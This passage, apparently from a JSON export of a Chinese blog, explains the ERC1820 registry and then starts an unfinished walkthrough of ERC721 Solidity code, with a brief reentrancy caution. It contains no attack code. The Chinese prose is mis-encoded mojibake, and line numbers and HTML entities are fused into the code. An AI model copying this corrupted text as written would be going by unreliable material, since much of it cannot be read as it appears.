***updateERC165Cache(address _contract, bytes4 _interfaceId)***å‡½æ•°ï¼Œé€šè¿‡implementsERC165InterfaceNoCache()å‡½æ•°æ¥åˆ¤æ–­ _contract æ˜¯å¦å®ç°äº† _interfaceIdï¼Œå¦‚æœå®ç°äº†åˆ™æ›´æ–° interfacesæ˜ å°„ï¼ŒåŒæ—¶æ›´æ–°ç¼“å­˜ï¼ˆè¿™ä¸ªæ¢æˆå§‹ç»ˆéƒ½æ˜¯è¢«è®¾ç½®ä¸ºtrueï¼Œæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘çš„ç†è§£æ˜¯ï¼Œåœ¨implementsERC165Interface()å‡½æ•°ä¸­å°±ç”¨çš„äº†è¿™ä¸ªæ˜ å°„ï¼Œå¦‚æœè¿™ä¸ªæ˜ å°„çš„å€¼ä¸º fasleåˆ™ä¼šè°ƒç”¨implementsERC165InterfaceNoCache()å‡½æ•°ï¼Œé‚£ä¹ˆå¦‚æœå€¼ä¸ºtrueé‚£ä¹ˆåˆ™ä¸éœ€è¦è°ƒç”¨ã€‚é‚£ä¹ˆè¿™æ ·ä¸€æ¥å°±å¯ä»¥èŠ‚çº¦gasçš„èŠ±è´¹äº†ï¼‰ã€‚ ***getManager(address _addr)***å‡½æ•°ï¼ŒæŸ¥è¯¢æŸåœ°å€çš„ç®¡ç†å‘˜æ˜¯è°ï¼Œå¦‚æœæ²¡æœ‰ç®¡ç†å‘˜ï¼Œåˆ™è¿”å›è‡ªå·±ï¼ˆç›¸å¯¹äºè‡ªå·±çš„ç®¡ç†å‘˜æ˜¯è‡ªå·±ï¼‰ã€‚ ***setManager(address _addr, address _newManager)***å‡½æ•°ï¼Œè®¾ç½®ç®¡ç†å‘˜ï¼Œç¡®ä¿åªèƒ½æ˜¯ _addrçš„ç®¡ç†å‘˜äº²è‡ªè°ƒç”¨ï¼Œå¦‚æœç®¡ç†å‘˜ç»™è‡ªå·±åˆè®¾ç½®ä¸€è¾¹ç®¡ç†å‘˜ï¼Œé‚£ä¹ˆmanagers[_addr] =address(0)ï¼Œç›¸å¯¹äºé‡ç½®ç®¡ç†å‘˜äº†ï¼Œç®¡ç†å‘˜å˜æˆäº†_addrè‡ªå·±ã€‚ ***getInterfaceImplementer(address _addr, bytes32 _interfaceHash)***å‡½æ•°ï¼ŒæŸ¥è¯¢åœ°å€æ˜¯å¦å®ç°äº†æ¥å£ä»¥åŠé€šè¿‡å“ªä¸ªåˆçº¦å®ç°çš„ï¼Œå¦‚æœ _addræ˜¯é›¶åœ°å€åˆ™å°† _addrçœ‹ä½œæ˜¯msg.senderã€‚å…ˆåˆ¤æ–­æ˜¯ IERC165æ¥å£hashå—ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™é€šè¿‡implementsERC165Interface()æ¥è·å–å®ç°çš„åœ°å€ï¼Œå¦‚æœä¸æ˜¯åˆ™é€šè¿‡æ˜ å°„interfacesæ¥æŸ¥çœ‹ã€‚ ***setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer)***ï¼šè®¾ç½®æŸä¸ªåœ°å€çš„æ¥å£ç”±å“ªä¸ªåˆçº¦å®ç°ï¼Œéœ€è¦ç”±ç®¡ç†å‘˜æ¥è®¾ç½®ï¼Œå¾…è®¾ç½®çš„å…³è”æ¥å£çš„åœ°å€ï¼ˆå¦‚æœâ€™_addrâ€™æ˜¯é›¶åœ°å€ï¼Œåˆ™å‡å®šä¸ºâ€™msg.senderâ€™ï¼‰ï¼Œè€Œä¸” _interfaceHash ä¸èƒ½ä¸º IERC165ï¼Œç„¶åé€šè¿‡å®ç°è€…_implementerçš„canImplementInterfaceForAddress()å‡½æ•°æ¥æ£€æµ‹ï¼Œå¦‚æœå®ç°äº†åˆ™é€šè¿‡ã€‚è¿™ä¸ªå‡½æ•°å¯ä»¥åœ¨è¿™é‡Œï¼šé“¾æ¥çœ‹åˆ°å®ç°é€»è¾‘ï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„é‡å…¥é£é™©ï¼Œå…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼‰ã€‚ æ³¨ï¼šERC1820ImplementerInterface(_implementer).canImplementInterfaceForAddress(_interfaceHash, addr)è¿™è¡Œä»£ç å¾ˆé‡è¦ï¼Œæœ‰é‡å…¥é£é™©ï¼ŒåŒæ—¶è¦æ±‚å®ç°è€…_implementerå¿…é¡»æŒ‰è¦æ±‚è¿”å›æŒ‡å®šçš„å€¼ERC1820_ACCEPT_MAGICã€‚ 3. æ€»ç»“ ERC1820åè®®ä¸»è¦ç”¨äºä»¥å¤ªåŠæ™ºèƒ½åˆçº¦çš„æ¥å£æŸ¥è¯¢å’Œç®¡ç†ã€‚å®ƒä¸ºæ™ºèƒ½åˆçº¦ä¹‹é—´çš„äº¤äº’æä¾›äº†æ ‡å‡†åŒ–çš„æ–¹å¼ï¼Œä½¿å¾—åˆçº¦å¯ä»¥å…¬å¼€å£°æ˜å¹¶æŸ¥è¯¢å®ƒä»¬æ‰€å®ç°çš„æ¥å£ã€‚è¿™å¯¹äºæ™ºèƒ½åˆçº¦çš„äº’æ“ä½œæ€§å’Œæ‰©å±•æ€§éå¸¸é‡è¦ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›å…·ä½“çš„åº”ç”¨åœºæ™¯ï¼š åˆçº¦åŠŸèƒ½å‘ç°ï¼šé€šè¿‡ERC1820åè®®ï¼Œåˆçº¦å¯ä»¥å…¬å¼€å£°æ˜å®ƒä»¬å®ç°çš„æ¥å£ï¼Œå…¶ä»–åˆçº¦å°±å¯ä»¥æŸ¥è¯¢è¿™äº›æ¥å£ï¼Œäº†è§£å¦‚ä½•ä¸è¯¥åˆçº¦äº¤äº’ã€‚è¿™ä½¿å¾—åˆçº¦ä¹‹é—´çš„äº¤äº’æ›´ä¸ºçµæ´»å’Œé«˜æ•ˆã€‚ åˆçº¦å‡çº§ï¼šæ™ºèƒ½åˆçº¦ä¸€æ—¦éƒ¨ç½²ï¼Œå…¶ä»£ç å°±ä¸èƒ½æ›´æ”¹ã€‚ä½†æ˜¯ï¼Œé€šè¿‡ERC1820åè®®ï¼Œå¯ä»¥å°†æ¥å£å®ç°çš„é€»è¾‘æ”¾åœ¨å¦ä¸€ä¸ªå¯ä»¥å‡çº§çš„åˆçº¦ä¸­ã€‚è¿™æ ·ï¼Œå³ä½¿ä¸»åˆçº¦çš„ä»£ç ä¸å˜ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ›´æ”¹å®ç°æ¥å£çš„åˆçº¦æ¥å‡çº§åŠŸèƒ½ã€‚ åˆçº¦äº’æ“ä½œæ€§ï¼šERC1820åè®®æ”¯æŒä»»æ„æ¥å£çš„æ³¨å†Œï¼Œè¿™ä½¿å¾—ä¸åŒçš„åˆçº¦å¯ä»¥å®ç°å’Œæ”¯æŒå„ç§å„æ ·çš„æ¥å£ï¼Œå¤§å¤§å¢å¼ºäº†åˆçº¦ä¹‹é—´çš„äº’æ“ä½œæ€§ã€‚ åˆçº¦å®‰å…¨æ€§ï¼šERC1820åè®®çš„æŸ¥è¯¢æœºåˆ¶å¯ä»¥é¿å…å¯¹æœªå®ç°ç‰¹å®šæ¥å£çš„åˆçº¦è¿›è¡Œé”™è¯¯çš„è°ƒç”¨ï¼Œä»è€Œå¢åŠ äº†æ™ºèƒ½åˆçº¦çš„å®‰å…¨æ€§ã€‚ æ€»çš„æ¥è¯´ï¼ŒERC1820åè®®çš„ä½œç”¨å°±æ˜¯æä¾›äº†ä¸€ç§æ ‡å‡†åŒ–çš„æ–¹å¼ï¼Œè®©æ™ºèƒ½åˆçº¦å¯ä»¥å…¬å¼€å£°æ˜å’ŒæŸ¥è¯¢æ¥å£ï¼Œä»è€Œç®€åŒ–äº†åˆçº¦ä¹‹é—´çš„äº’åŠ¨ã€‚ æœ‰äº†è¿™äº›å‰ç½®çŸ¥è¯†ï¼Œå°±å¯ä»¥ç»§ç»­å­¦ä¹ ERC777äº†ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1820","slug":"ERC1820","permalink":"https://biyouqiuqiu.com/tags/ERC1820/"}]},{"title":"ERC721 æœªå®Œæˆ","slug":"DEFI/ERC/ERC721","date":"2024-01-05T04:00:00.000Z","updated":"2024-01-05T04:00:00.000Z","comments":true,"path":"2024/01/05/DEFI/ERC/ERC721/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/05/DEFI/ERC/ERC721/","excerpt":"","text":"1. ERC721ç®€ä»‹ â€‹ è¯¥åè®®å…è®¸åœ¨æ™ºèƒ½åˆçº¦ä¸­å®æ–½NFTæ ‡å‡†APIã€‚è¯¥æ ‡å‡†æä¾›äº†è·Ÿè¸ªå’Œä¼ è¾“NFTçš„åŸºæœ¬åŠŸèƒ½ã€‚ â€‹ é¦–å…ˆäº†è§£ä»€ä¹ˆæ˜¯éåŒè´¨åŒ–ä»£å¸ï¼ŒNTF çš„å…¨ç§°æ˜¯ Non-Fungible Tokenï¼Œå³éåŒè´¨åŒ–ä»£å¸ã€‚éåŒè´¨åŒ–çš„æ„æ€æ˜¯æŸç‰©ä¸å¯ä¸å¦ä¸€ç‰©äº’æ¢ï¼Œå®ƒæ˜¯ç‹¬ä¸€æ— äºŒçš„ã€‚ä¾‹å¦‚ï¼Œæˆ‘å®¶çš„é’¥åŒ™å’Œä½ å®¶çš„é’¥åŒ™ï¼Œçœ‹èµ·æ¥éƒ½æ˜¯é’¥åŒ™ï¼Œä½†æ˜¯ä¸èƒ½äº¤æ¢çš„ï¼Œå› ä¸ºæˆ‘å®¶çš„é’¥åŒ™æ‰“ä¸å¼€ä½ å®¶çš„é—¨ï¼Œåä¹‹ä½ çš„é’¥åŒ™ä¹Ÿæ˜¯ã€‚ â€‹ ERC721å’ŒERC20ä¸€æ ·ï¼Œéƒ½æ˜¯ä¸€ä¸ªä»£å¸æ ‡å‡†ï¼ŒERC721ä»£å¸æ˜¯ä¸å¯ç»†åˆ†çš„ï¼Œæ¯ä¸€ä¸ªä»£å¸éƒ½æ˜¯å”¯ä¸€çš„ã€‚æ¯ä¸€ä¸ªERC721ä»£å¸éƒ½æœ‰è‡ªå·±çš„æ ‡è¯†ç¬¦ï¼Œé€šå¸¸ç”¨äºè¡¨ç¤ºç‹¬ç«‹çš„èµ„äº§ï¼Œä¾‹å¦‚æ•°å­—è‰ºæœ¯å“ï¼Œæ¸¸æˆä¸­çš„è™šæ‹Ÿè§’è‰²æˆ–æˆ¿åœ°äº§ã€‚ 2. è§£æä»£ç æºç æ¥è‡ªï¼šé“¾æ¥ã€‚ 2.1 Coreéƒ¨åˆ†2.1.1 IERC721.solæ¥å£å†…å®¹ï¼š 1234567891011121314151617// SPDX-License-Identifier: MITpragma solidity ^0.8.20;interface IERC721 is IERC165 &#123; event Transfer(address indexed from, address indexed to, uint256 indexed tokenId); event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId); event ApprovalForAll(address indexed owner, address indexed operator, bool approved); function balanceOf(address owner) external view returns (uint256 balance); function ownerOf(uint256 tokenId) external view returns (address owner); function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external; function safeTransferFrom(address from, address to, uint256 tokenId) external; function transferFrom(address from, address to, uint256 tokenId) external; function approve(address to, uint256 tokenId) external; function setApprovalForAll(address operator, bool approved) external; function getApproved(uint256 tokenId) external view returns (address operator); function isApprovedForAll(address owner, address operator) external view returns (bool);&#125; åˆ†æå„æ¥å£çš„åŠŸèƒ½ï¼š balanceOf(): è¿”å›ç”±_owner æŒæœ‰çš„NFTsçš„æ•°é‡ã€‚ ownerOf(): è¿”å›tokenIdä»£å¸æŒæœ‰è€…çš„åœ°å€ã€‚ approve(): æˆäºˆåœ°å€_toå…·æœ‰_tokenIdçš„æ§åˆ¶æƒï¼Œæ–¹æ³•æˆåŠŸåéœ€è§¦å‘Approval äº‹ä»¶ã€‚ setApprovalForAll(): æˆäºˆåœ°å€_operatorå…·æœ‰æ‰€æœ‰NFTsçš„æ§åˆ¶æƒï¼ŒæˆåŠŸåéœ€è§¦å‘ApprovalForAlläº‹ä»¶ã€‚ getApproved()ã€isApprovedForAll(): ç”¨æ¥æŸ¥è¯¢æˆæƒã€‚ transferFrom()ï¼šç”¨æ¥è½¬ç§»NFTï¼Œæ¥æ”¶è€…ä¸èƒ½ä¸ºé›¶åœ°å€ï¼Œä¸”msg.senderé¡»è¦è¢«ownerOf(tokenId)æˆæƒï¼Œæ‰§è¡Œå®ŒtransferFromä¹‹åï¼Œmsg.senderçš„æƒé™ä¾¿ä¼šè¢«ç§»é™¤ã€‚ safeTransferFrom()ï¼šç”¨æ¥è½¬ç§»NFTï¼ŒåŠŸèƒ½å’Œ transferFromä¸€æ ·ï¼Œä½†æ˜¯ä¸€äº›è¦æ±‚ï¼Œå¦‚æœreceiveræ˜¯ä¸€ä¸ªåˆçº¦ï¼Œé‚£ä¹ˆè¯¥åˆçº¦éœ€è¦å®ç°ERC721TokenReceiver::onERC721Received(address _from, uint256 _tokenId, bytes data) external returns(bytes4) å‡½æ•°ï¼ŒåŒæ—¶è¿”å›å€¼ä¸ºï¼šbytes4(keccak256(&quot;onERC721Received(address,uint256,bytes)&quot;))ï¼Œå› ä¸ºåœ¨è°ƒç”¨safeTransferFromå‡½æ•°æ—¶ï¼Œä¼šå¯¹ receiver è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœreceveræ˜¯EOAä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ transferFromå’ŒsafeTransferFromçš„åŒºåˆ«ï¼Œåé¢å†è¯¦ç»†è¯´æ˜ã€‚ 2.1.2 IERC721Metadataè¯¥æ¥å£å’Œ IERC20Metadata ç±»ä¼¼ï¼Œéƒ½æ˜¯å¯é€‰æ‹©çš„ã€‚è¯¥æ¥å£æ˜¯ç”¨æ¥å­˜å‚¨é¢å¤–æ•°æ®çš„ï¼Œæ¯”å¦‚ä»£å¸çš„nameï¼Œsymbolä»¥åŠURIã€‚ è¿™ä¸ªURIå¯ä»¥æ˜¯å›¾ç‰‡é“¾æ¥ç­‰ã€‚ 2.1.3 IERC721Enumerable12345interface ERC721Enumerable &#123; function totalSupply() external view returns (uint256); function tokenByIndex(uint256 _index) external view returns (uint256); function tokenOfOwnerByIndex(address _owner, uint256 _index) external view returns (uint256);&#125; è¯¥æ¥å£æä¾›äº†ä¸‰ä¸ªå‡½æ•°ï¼Œæ—¨åœ¨æé«˜NTFçš„å¯è¯»æ€§å’Œå¯è®¿é—®æ€§ï¼ŒåŒæ—¶ä¹Ÿè¿›ä¸€æ­¥å®Œå–„äº†NTFäº¤æ˜“å¸‚åœºçš„åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½å¯ç”¨äºæŸ¥è¯¢NTFå¸‚åœºå‘è¡Œäº†å¤šå°‘ä»£å¸ï¼ŒæŸäººçš„ç¬¬indexå·ä»£å¸çš„tokenIdæ˜¯å¤šå°‘ï¼Œè¿˜å¯ä»¥æ ¹æ®å‘è¡Œçš„indexæ‰¾åˆ°å¯¹åº”çš„tokenIdã€‚ totalSupply() ï¼šè¿”å›å‘è¡ŒTokençš„æ€»é‡ã€‚ tokenByIndex()ï¼šæ ¹æ®ç´¢å¼•è¿”å›å¯¹åº”çš„tokenIdã€‚ tokenOfOwnerByIndex()ï¼šæ ¹æ®ç´¢å¼•æŸ¥è¯¢æ‰€æœ‰è€…Tokenåˆ—è¡¨ä¸­å¯¹åº”ç´¢å¼•çš„tokenIdã€‚ 2.1.4 ERC721â€‹ è¿™ä¸ªåˆçº¦æ˜¯ERC-721åè®®ä¸­æœ€é‡è¦ä¹Ÿæ˜¯æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œéœ€è¦é‡ç‚¹è§£è¯»ã€‚ _update()å‡½æ•°æ˜¯è´¯ç©¿äº†ï¼Œé“¸å¸ï¼Œé”€å¸ï¼Œä»¥åŠè½¬å¸ï¼Œæ‰€ä»¥é¦–å…ˆè¦é‡ç‚¹çœ‹æ‡‚è¿™ä¸ªå‡½æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930function _update(address to, uint256 tokenId, address auth) internal virtual returns (address) &#123; address from = _ownerOf(tokenId); // Perform (optional) operator check if (auth != address(0)) &#123; _checkAuthorized(from, auth, tokenId); &#125; // Execute the update if (from != address(0)) &#123; // Clear approval. No need to re-authorize or emit the Approval event _approve(address(0), tokenId, address(0), false); unchecked &#123; _balances[from] -= 1; &#125; &#125; if (to != address(0)) &#123; unchecked &#123; _balances[to] += 1; &#125; &#125; _owners[tokenId] = to; emit Transfer(from, to, tokenId); return from;&#125; å…¶ä¸­å‚æ•°æ˜¯éœ€è¦æ˜ç¡®çš„ï¼Œtoæ˜¯å¾…è½¬ç§»çš„åœ°å€ï¼Œå¯ä»¥ç†è§£ä¸º æ¥æ”¶è€…receiverï¼›tokenIdæ˜¯å¾…æ“ä½œçš„tokenï¼›authæ˜¯ä»£å¸çš„æ‰€æœ‰è€…æˆ–æ˜¯è¢«æˆæƒè€…ã€‚ _update()æ˜¯å¦‚ä½•å®ç°mintã€burnå’ŒtransferFromçš„ï¼Œå‡½æ•°çš„æ‰§è¡Œé€»è¾‘ï¼š é¦–å…ˆç¬¬ä¸€æ­¥éƒ½æ˜¯è·å–å¾…æ“ä½œçš„tokenIdçš„æ‰€æœ‰è€…ã€‚ mintçš„å®ç°ï¼Œè°ƒç”¨æ–¹å¼ä¸ºï¼š_update(to, tokenId, address(0)) å‡½æ•°æ‰§è¡Œï¼Œfromçš„å€¼ä¸ºé›¶åœ°å€ï¼Œç¨‹åºç›´æ¥æ‰§è¡Œåˆ°ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼Œtoçš„_balanceåŠ ä¸€ï¼Œè¯¥tokenIdçš„æ‰€æœ‰è€…ä¸ºto transferFromçš„å®ç°ï¼ŒsafeTransferFromåŒæ ·æ˜¯è°ƒç”¨transferFromï¼Œè°ƒç”¨çš„æ–¹å¼ä¸ºï¼šaddress previousOwner = _update(to, tokenId, _msgSender())ï¼Œé¦–å…ˆå¯ä»¥çŸ¥é“toä¸ä¸ºé›¶åœ°å€ï¼Œ_msgSender()ä¹Ÿä¸ä¸ºé›¶ï¼Œè‡³å°‘ç›®å‰é›¶åœ°å€çš„ç§é’¥è¿˜æ²¡äººçŸ¥é“ã€‚å‡½æ•°æ‰§è¡Œï¼Œfromçš„å€¼ä¸ºä»£å¸æ‰€æœ‰è€…ï¼Œè¿›å…¥ç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œå¦‚æœauthæ˜¯ä»£å¸æ‰€æœ‰è€…æˆ–æ˜¯è¢«æˆæƒè€…åˆ™é€šè¿‡æ£€æµ‹ï¼Œè¿›å…¥ç¬¬äºŒä¸ªifè¯­å¥ï¼Œç§»é™¤åŸtokenIdæ‰€æœ‰è€…å¯¹å…¶ä»–äººçš„æˆæƒï¼Œä»£å¸æ‰€æœ‰è€…çš„tokenæ•°å‡ä¸€ï¼Œæœ€åè¿›å…¥ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼Œæ¥æ”¶è€…çš„tokenæ•°åŠ ä¸€ï¼Œæ›´æ–°mappingã€‚ burnçš„å®ç°ï¼Œè°ƒç”¨æ–¹æ³•ï¼š_update(address(0), tokenId, address(0))ï¼Œè¿›å…¥ç¬¬äºŒä¸ªifè¯­å¥ï¼Œç§»é™¤åŸtokenIdæ‰€æœ‰è€…å¯¹å…¶ä»–äººçš„æˆæƒï¼Œä»£å¸æ‰€æœ‰è€…çš„tokenæ•°å‡ä¸€ï¼Œå°†ä»£å¸æ‰€æœ‰è€…è®¾ç½®ä¸ºé›¶åœ°å€ã€‚ transferçš„å®ç°ï¼Œè°ƒç”¨æ–¹å¼ä¸ºï¼š_update(to, tokenId, address(0))ï¼Œé¦–å…ˆtoä¸ä¸ºé›¶ï¼Œè¿›å…¥ç¬¬äºŒä¸ªifè¯­å¥ï¼Œç§»é™¤åŸtokenIdæ‰€æœ‰è€…å¯¹å…¶ä»–äººçš„æˆæƒï¼Œä»£å¸æ‰€æœ‰è€…çš„tokenæ•°å‡ä¸€ï¼Œæœ€åè¿›å…¥ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼Œæ¥æ”¶è€…çš„tokenæ•°åŠ ä¸€ï¼Œæ›´æ–°mappingã€‚ åˆçº¦ä¸­è¿˜æœ‰å‡ ä¸ªæ˜ å°„ï¼š _ownersï¼šä¿å­˜æŸä¸ªtokenIdçš„æ‰€æœ‰è€…ã€‚ _balancesï¼šä¿å­˜æŸä¸ªç”¨æˆ·æ‹¥æœ‰çš„Tokenæ•°é‡ã€‚ _tokenApprovalsï¼šä¿å­˜æŸä¸ªtokençš„æˆæƒè´¦æˆ·ã€‚ _operatorApprovalsï¼šä¿å­˜æŸè´¦æˆ·æ˜¯å¦å°†æ‰€æœ‰çš„tokenå…¨éƒ¨æˆæƒç»™æŸè´¦æˆ·ã€‚ _checkAuthorized(address owner, address spender, uint256 tokenId)å‡½æ•°è´Ÿè´£æ£€æµ‹å¯¹äºæŒ‡å®štokenIdï¼Œownerå’Œspenderçš„å…³ç³»ï¼Œåªæœ‰å½“spenderä¸ä¸ºé›¶åœ°å€ï¼Œä¸”ï¼ˆowner&#x3D;&#x3D;spenderã€ä»£å¸æ‰€æœ‰è€…äº²è‡ªæ“ä½œã€‘æˆ–ownerå°†æ‰€æœ‰ä»£å¸æˆæƒç»™äº†spenderï¼Œæˆ–ownerå°†tokenIdè¿™æštokenæˆæƒç»™äº†spenderï¼‰æ‰å¯ä»¥é€šè¿‡ã€‚ 2.1.5 ERC721Enumerableè¯¥åˆåŒç»§æ‰¿äº†ERC721ï¼Œä½†æ˜¯é‡å†™äº† ERC721ä¸­çš„ _update()å‡½æ•°ï¼Œè¿™ä¸€æ“ä½œä½¿å¾—ERC721ä¸­çš„ é“¸å¸ã€é”€å¸ã€è½¬è´¦éƒ½ç¹å‘ç”Ÿäº†å˜åŒ–ã€‚ é¢˜å¤–è¯ è¿™æ˜¯solidityç»§æ‰¿çš„åŸºæœ¬çŸ¥è¯†ï¼ŒéªŒè¯å¦‚ä¸‹ï¼š 1234567891011121314151617contract Person &#123; function eat() public virtual &#123; console.log(&quot;Person&quot;); &#125; function call() public &#123; eat(); &#125;&#125;contract Man is Person &#123; function eat() public override &#123; console.log(&quot;Man&quot;); &#125;&#125; å¤ç°é€»è¾‘ï¼šéƒ¨ç½²Manåˆçº¦ï¼Œå¹¶è°ƒç”¨callå‡½æ•°çœ‹çœ‹è¾“å‡ºç»“æœæ˜¯ä»€ä¹ˆã€‚ å°±æ˜¯Manï¼Œè™½ç„¶callå‡½æ•°å£°æ˜åœ¨çˆ¶ç±»ä¸­ï¼Œä½†æ˜¯çˆ¶ç±»ä¼šè°ƒç”¨å­ç±»é‡å†™çš„eatå‡½æ•°ï¼Œè¿™å¯ä»¥ç†è§£ä¸ºã€å°±è¿‘åŸåˆ™ã€‘ã€‚ çœ‹åˆ°è¯¥åˆçº¦_updateçš„å®ç°é€»è¾‘ï¼š 12345678910111213141516function _update(address to, uint256 tokenId, address auth) internal virtual override returns (address) &#123; address previousOwner = super._update(to, tokenId, auth); if (previousOwner == address(0)) &#123; _addTokenToAllTokensEnumeration(tokenId); &#125; else if (previousOwner != to) &#123; _removeTokenFromOwnerEnumeration(previousOwner, tokenId); &#125; if (to == address(0)) &#123; _removeTokenFromAllTokensEnumeration(tokenId); &#125; else if (previousOwner != to) &#123; _addTokenToOwnerEnumeration(to, tokenId); &#125; return previousOwner;&#125; taè°ƒç”¨äº†çˆ¶ç±»çš„_updateå‡½æ•°ï¼Œè¯´æ˜ä»£å¸çš„è½¬ç§»é€»è¾‘è¿˜æ˜¯è¿˜ERC721çš„ä¸€æ ·ï¼Œåªæ˜¯æ ¹æ® tokenIdçš„æ‰€æœ‰è€…ä»¥åŠæ¥æ”¶è€…è¿›è¡Œäº†ä¸€äº›å¯¹æ•°ç»„çš„æ·»åŠ å’Œåˆ é™¤æ“ä½œã€‚åˆ©ç”¨æ•°ç»„æ¥è®°å½•ä»£å¸çš„å‘è¡Œé‡ã€‚ 2.1.6 IERC721Receiverâ€‹ è¯¥åˆçº¦åªæœ‰ä¸€ä¸ªå‡½æ•°ï¼Œåˆ™æ˜¯ onERC721Received()ï¼Œè¿™æ˜¯å½“æ¥æ”¶è€… to ä¸ºåˆçº¦åœ°å€æ—¶ï¼Œåœ¨è°ƒç”¨ERC721ä¸­çš„ä¸‰ä¸ªsafeå‡½æ•°ï¼ˆ_safeMint, _safeTransfer, safeTransferFromï¼‰æ—¶çš„å›è°ƒå‡½æ•°ã€‚å®ç°è¿™ä¸ªæ¥å£çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¸ºä»€ä¹ˆå½“toä¸ºEOAæ—¶åˆ™å¯ä»¥ä¸éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•å‘¢ï¼Ÿæˆ‘çš„ç†è§£æ˜¯ï¼Œå¦‚æœæœ‰äººå‘æˆ‘tx.originè½¬å…¥ ERC721 tokençš„æ—¶å€™ï¼Œæˆ‘å¯ä»¥å»è°ƒç”¨transferFromæˆ–è€…safeTransferFromå‡½æ•°å°†æ‰‹ä¸­çš„ä»£å¸è½¬å‡ºå»ï¼Œä½†æ˜¯å¦‚æœè½¬å…¥çš„æ˜¯åˆçº¦åœ°å€ï¼Œé‚£ä¹ˆå¦‚æœä½ å®ç°æ²¡æœ‰æä¾›è°ƒç”¨ ransferFromæˆ–è€…safeTransferFromå‡½æ•° çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆè¿™ä¸ªtokenå°†æ°¸è¿œçš„ç•™åœ¨äº†è¿™ä¸ªåˆçº¦ä¸­ï¼Œæ— æ³•è½¬ç§»å‡ºå»ã€‚è€Œæ˜ç¡®è¦æ±‚åˆçº¦æ¥æ”¶è€…å®ç°è¿™ä¸ªå‡½æ•°ï¼Œè¿™æ˜¯ä¸ºäº†è®©æ¥æ”¶è€…æœ‰æ„è¯†åœ°å»å¤„ç†æ¥æ”¶åˆ°çš„tokenã€‚å½“ç„¶ï¼Œè¦æ˜¯å®ç°äº†æ¥å£è€Œå‡½æ•°ä½“åªæ˜¯æŒ‰ç…§è¦æ±‚è¿”å›å›ºå®šå€¼ï¼Œé‚£ä¹ˆè¿˜æ˜¯ä¼šè¢«é”æ­»è¿™ä¸ªtokenï¼Œå› ä¸ºäººå®¶æé†’ä½ äº†ï¼Œåšä¸åšå°±æ˜¯è‡ªå·±çš„äº‹äº†ã€‚ 2.2 Extensionséƒ¨åˆ†2.2.1 ERC721Pausableâ€‹ è¯¥åˆçº¦æä¾›äº†ä¸€ä¸ªç´§æ€¥æš‚åœåŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨åˆçº¦è¢«é»‘å®¢æ”»å‡»æ—¶ï¼Œåˆçº¦é€šè¿‡å¯ä»¥ä¿®é¥°å™¨é”ä½æ‰€æœ‰çš„è½¬è´¦åŠŸèƒ½ï¼Œè¿™æ˜¯ä¸€ç§é˜²æŠ¤æªæ–½ã€‚ 2.2.2 ERC721Burnableâ€‹ è¯¥åˆçº¦å¯¹å¤–æä¾›äº†ä¸€ä¸ªé”€å¸çš„åŠŸèƒ½ã€‚ 2.2.3 ERC721Consecutive2.2.4 ERC721URIStorageâ€‹ è¯¥åˆçº¦æä¾›äº†ä¸€ä¸ªè®¾ç½® tokenURIçš„å‡½æ•°ï¼š_setTokenURI(uint256 tokenId, string memory _tokenURI)ï¼Œä½¿å…¶tokenIdåœ¨mintçš„æ—¶å€™ï¼Œå°±å¯ä»¥ä¸æŸä¸ªURIç»‘å®šèµ·æ¥ã€‚ 2.2.5 ERC721Votes2.2.6 ERC721Royalty2.2.7 ERC721Wrapperâ€‹ è¯¥åˆçº¦æä¾›äº†ä¸€ä¸ªåŒ…è£…åŠŸèƒ½ï¼Œæ¯”å¦‚ ç”¨æˆ·å°†æ‰‹ä¸­çš„ _underlyingä»£å¸å­˜å…¥åˆ°è¯¥åˆçº¦ä¸­ï¼Œé‚£ä¹ˆè¯¥åˆçº¦ä¼šä¸ºç”¨æˆ·é“¸é€ ä¸€ä¸ªç›¸åŒtokenIdçš„ä»£å¸ï¼ŒåŒç†å–å‡ºçš„è¯ï¼Œä¼šå°†ç”¨æˆ·ä»è¯¥åˆçº¦è·å–çš„tokenIdå…¨éƒ¨é”€æ¯ï¼Œé”€æ¯çš„æ–¹å¼ä¸ºï¼š_update(address(0), tokenId, _msgSender())(çªç„¶æ„Ÿè§‰ï¼Œè¿™ä¸ªupdateå‡½æ•°çœŸçš„å¤ªç‰›äº†ï¼Œè¿™ä¸ªå…¼å®¹æ€§çœŸçš„ï¼Œä½©æœçš„å¾ˆã€‚)åˆçº¦è¿˜å®ç°äº†onERC721Receivedå‡½æ•°ï¼Œå®ç°é€»è¾‘å¦‚ä¸‹ï¼š 1234567function onERC721Received(address, address from, uint256 tokenId, bytes memory) public virtual returns (bytes4) &#123; if (address(underlying()) != _msgSender()) &#123; revert ERC721UnsupportedToken(_msgSender()); &#125; _safeMint(from, tokenId); return IERC721Receiver.onERC721Received.selector;&#125; è¿™ä¸ªå‡½æ•°æ˜¯ä¸ºäº†è®©å…¶ä»–ç”¨æˆ·é€šè¿‡ _underlying çš„ safeTransferFrom 